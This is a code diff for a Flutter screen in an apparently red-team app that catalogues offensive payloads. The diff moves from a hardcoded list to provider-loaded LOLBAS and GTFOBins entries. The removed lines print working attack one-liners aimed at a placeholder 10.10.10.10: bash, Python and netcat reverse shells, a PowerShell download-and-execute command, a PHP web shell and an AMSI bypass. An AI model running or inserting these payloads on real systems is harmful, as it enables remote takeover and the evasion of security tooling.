@@ -6,6 +6,9 @@ import 'package:gap/gap.dart';
 import '../../../../core/theme/app_colors.dart';
 import '../../../../core/localization/app_translations.dart';
 import '../../../../shared/widgets/redops_header.dart';
+import '../../../../shared/widgets/tactical_loader.dart';
+import '../../domain/entities/payload.dart';
+import '../providers/payload_providers.dart';
 
 class PayloadVaultScreen extends ConsumerStatefulWidget {
   const PayloadVaultScreen({super.key});
@@ -15,76 +18,20 @@ class PayloadVaultScreen extends ConsumerStatefulWidget {
 }
 
 class _PayloadVaultScreenState extends ConsumerState<PayloadVaultScreen> {
-  String _searchQuery = '';
-  String _selectedCategory = 'ALL';
-
   final List<String> _categories = [
     'ALL',
-    'WEB',
     'WINDOWS',
     'LINUX',
-    'EVASION',
-    'NETWORKING'
+    'WEB',
+    'LOLBAS',
+    'GTFOBins'
   ];
-
-  final List<_PayloadItem> _payloads = [
-    _PayloadItem(
-      title: 'Bash Reverse Shell',
-      category: 'LINUX',
-      description: 'Classic interactive bash reverse shell command.',
-      code: 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1',
-      icon: Icons.terminal,
-    ),
-    _PayloadItem(
-      title: 'PowerShell IEX Download',
-      category: 'WINDOWS',
-      description: 'Download and execute a script in memory.',
-      code: 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.10.10/shell.ps1\')"',
-      icon: Icons.desktop_windows,
-    ),
-    _PayloadItem(
-      title: 'PHP Web Shell (Simple)',
-      category: 'WEB',
-      description: 'One-liner PHP shell for command execution.',
-      code: '<?php system(\$_GET["cmd"]); ?>',
-      icon: Icons.language,
-    ),
-    _PayloadItem(
-      title: 'Python Reverse Shell',
-      category: 'LINUX',
-      description: 'Python one-liner for a socket-based reverse shell.',
-      code: 'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'',
-      icon: Icons.code,
-    ),
-    _PayloadItem(
-      title: 'Netcat Traditional',
-      category: 'NETWORKING',
-      description: 'Reverse shell using the -e flag (traditional nc).',
-      code: 'nc -e /bin/sh 10.10.10.10 4444',
-      icon: Icons.settings_input_component,
-    ),
-    _PayloadItem(
-      title: 'AMSI Bypass (PowerShell)',
-      category: 'EVASION',
-      description: 'Patching AMSI in memory to bypass security checks.',
-      code: '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue(\$null,\$true)',
-      icon: Icons.security_outlined,
-    ),
-  ];
-
-  List<_PayloadItem> get _filteredPayloads {
-    return _payloads.where((p) {
-      final matchCat = _selectedCategory == 'ALL' || p.category == _selectedCategory;
-      final matchSearch = p.title.toLowerCase().contains(_searchQuery.toLowerCase()) ||
-          p.description.toLowerCase().contains(_searchQuery.toLowerCase());
-      return matchCat && matchSearch;
-    }).toList();
-  }
 
   @override
   Widget build(BuildContext context) {
     final s = ref.watch(l10nProvider);
     final isDark = Theme.of(context).brightness == Brightness.dark;
+    final filteredAsync = ref.watch(filteredPayloadsProvider);
 
     return Scaffold(
       backgroundColor: Theme.of(context).scaffoldBackgroundColor,
@@ -93,12 +40,23 @@ class _PayloadVaultScreenState extends ConsumerState<PayloadVaultScreen> {
           children: [
             RedOpsHeader(
               title: s.vaultTitle,
-              subtitle: s.vaultSubtitle,
+              subtitle: 'Tactical bypass and exploit payload repository',
             ),
             _buildSearch(isDark, s),
+            const Gap(6),
             _buildCategories(isDark),
+            const Gap(10),
             Expanded(
-              child: _buildList(s),
+              child: filteredAsync.when(
+                data: (payloads) => _buildList(payloads, s),
+                loading: () => const Center(child: TacticalLoader(size: 100)),
+                error: (err, _) => Center(
+                  child: Text(
+                    'FAILED TO SYNC PAYLOADS: $err',
+                    style: const TextStyle(color: AppColors.criticalFg, fontWeight: FontWeight.bold),
+                  ),
+                ),
+              ),
             ),
           ],
         ),
@@ -110,14 +68,14 @@ class _PayloadVaultScreenState extends ConsumerState<PayloadVaultScreen> {
     return Padding(
       padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
       child: TextField(
-        onChanged: (v) => setState(() => _searchQuery = v),
+        onChanged: (v) => ref.read(payloadSearchQueryProvider.notifier).state = v,
         style: TextStyle(
           color: isDark ? AppColors.textPrimary : AppColors.lightTextPrimary, 
           fontSize: 14, 
           fontFamily: 'monospace'
         ),
         decoration: InputDecoration(
-          hintText: s.searchVault,
+          hintText: 'Search LOLBAS, GTFOBins, Web shells...',
           prefixIcon: Icon(
             Icons.search, 
             color: isDark ? AppColors.redPrimary : AppColors.deepBlue, 
@@ -140,6 +98,7 @@ class _PayloadVaultScreenState extends ConsumerState<PayloadVaultScreen> {
 
   Widget _buildCategories(bool isDark) {
     final primaryColor = isDark ? AppColors.redPrimary : AppColors.deepBlue;
+    final selectedCategory = ref.watch(payloadCategoryProvider);
 
     return SizedBox(
       height: 38,
@@ -150,9 +109,9 @@ class _PayloadVaultScreenState extends ConsumerState<PayloadVaultScreen> {
         separatorBuilder: (_, __) => const SizedBox(width: 8),
         itemBuilder: (_, i) {
           final cat = _categories[i];
-          final isSelected = cat == _selectedCategory;
+          final isSelected = cat == selectedCategory;
           return GestureDetector(
-            onTap: () => setState(() => _selectedCategory = cat),
+            onTap: () => ref.read(payloadCategoryProvider.notifier).state = cat,
             child: AnimatedContainer(
               duration: 200.ms,
               padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
@@ -180,25 +139,24 @@ class _PayloadVaultScreenState extends ConsumerState<PayloadVaultScreen> {
     ).animate().fadeIn(delay: 200.ms);
   }
 
-  Widget _buildList(AppStrings s) {
-    final items = _filteredPayloads;
-    if (items.isEmpty) {
+  Widget _buildList(List<Payload> payloads, AppStrings s) {
+    if (payloads.isEmpty) {
       return Center(
         child: Text(s.noDataFound, style: const TextStyle(color: AppColors.textTertiary)),
       );
     }
     return ListView.separated(
-      padding: const EdgeInsets.all(20),
-      itemCount: items.length,
+      padding: const EdgeInsets.fromLTRB(20, 10, 20, 100),
+      itemCount: payloads.length,
       separatorBuilder: (_, __) => const Gap(16),
-      itemBuilder: (context, index) => _PayloadCard(payload: items[index], index: index),
+      itemBuilder: (context, index) => _PayloadCard(payload: payloads[index], index: index),
     );
   }
 }
 
 class _PayloadCard extends ConsumerStatefulWidget {
   const _PayloadCard({required this.payload, required this.index});
-  final _PayloadItem payload;
+  final Payload payload;
   final int index;
 
   @override
@@ -217,12 +175,23 @@ class _PayloadCardState extends ConsumerState<_PayloadCard> {
     });
     ScaffoldMessenger.of(context).showSnackBar(
       SnackBar(
-        content: Text('${s.copied.toUpperCase()}: ${widget.payload.title.toUpperCase()}'),
+        content: Text('COPIED: ${widget.payload.title.toUpperCase()}'),
         backgroundColor: AppColors.redPrimary,
         duration: const Duration(seconds: 1),
         behavior: SnackBarBehavior.floating,
       ),
     );
+  }
+
+  IconData _getCategoryIcon() {
+    if (widget.payload.source == 'LOLBAS') return Icons.desktop_windows_rounded;
+    if (widget.payload.source == 'GTFOBins') return Icons.terminal_rounded;
+    switch (widget.payload.category.toUpperCase()) {
+      case 'WINDOWS': return Icons.desktop_windows_rounded;
+      case 'LINUX': return Icons.terminal_rounded;
+      case 'WEB': return Icons.language_rounded;
+      default: return Icons.code_rounded;
+    }
   }
 
   @override
@@ -250,23 +219,41 @@ class _PayloadCardState extends ConsumerState<_PayloadCard> {
                 color: isDark ? AppColors.bg800 : AppColors.lightScaffold,
                 borderRadius: BorderRadius.circular(8),
               ),
-              child: Icon(widget.payload.icon, color: primaryColor, size: 20),
+              child: Icon(_getCategoryIcon(), color: primaryColor, size: 20),
             ),
             title: Text(
               widget.payload.title,
+              maxLines: 1,
+              overflow: TextOverflow.ellipsis,
               style: TextStyle(
                 color: isDark ? AppColors.textPrimary : AppColors.lightTextPrimary, 
                 fontWeight: FontWeight.bold, 
                 fontSize: 14
               ),
             ),
-            subtitle: Text(
-              widget.payload.category,
-              style: TextStyle(
-                color: isDark ? AppColors.textTertiary : AppColors.lightTextTertiary, 
-                fontSize: 10, 
-                fontWeight: FontWeight.w900
-              ),
+            subtitle: Row(
+              children: [
+                Text(
+                  widget.payload.category,
+                  style: TextStyle(
+                    color: isDark ? AppColors.textTertiary : AppColors.lightTextTertiary, 
+                    fontSize: 10, 
+                    fontWeight: FontWeight.w900
+                  ),
+                ),
+                const Gap(8),
+                Container(
+                  padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 2),
+                  decoration: BoxDecoration(
+                    color: primaryColor.withValues(alpha: 0.1),
+                    borderRadius: BorderRadius.circular(4),
+                  ),
+                  child: Text(
+                    widget.payload.source.toUpperCase(),
+                    style: TextStyle(color: primaryColor, fontSize: 8, fontWeight: FontWeight.bold),
+                  ),
+                ),
+              ],
             ),
             trailing: Icon(
               _isExpanded ? Icons.keyboard_arrow_up : Icons.keyboard_arrow_down,
@@ -312,7 +299,7 @@ class _PayloadCardState extends ConsumerState<_PayloadCard> {
                     child: OutlinedButton.icon(
                       onPressed: () => _copyToClipboard(s),
                       icon: Icon(_isCopied ? Icons.check : Icons.copy, size: 16),
-                      label: Text(_isCopied ? s.copied.toUpperCase() : s.copyPayload),
+                      label: Text(_isCopied ? 'COPIED' : 'COPY PAYLOAD'),
                       style: OutlinedButton.styleFrom(
                         foregroundColor: _isCopied ? AppColors.live : primaryColor,
                         side: BorderSide(color: _isCopied ? AppColors.live : primaryColor),
@@ -324,22 +311,6 @@ class _PayloadCardState extends ConsumerState<_PayloadCard> {
             ),
         ],
       ),
-    ).animate().fadeIn(delay: (widget.index * 100).ms).slideX(begin: 0.1, end: 0);
+    ).animate(delay: (widget.index * 50).ms).fadeIn(duration: 300.ms).slideX(begin: 0.1, end: 0);
   }
-}
-
-class _PayloadItem {
-  final String title;
-  final String category;
-  final String description;
-  final String code;
-  final IconData icon;
-
-  _PayloadItem({
-    required this.title,
-    required this.category,
-    required this.description,
-    required this.code,
-    required this.icon,
-  });
 }
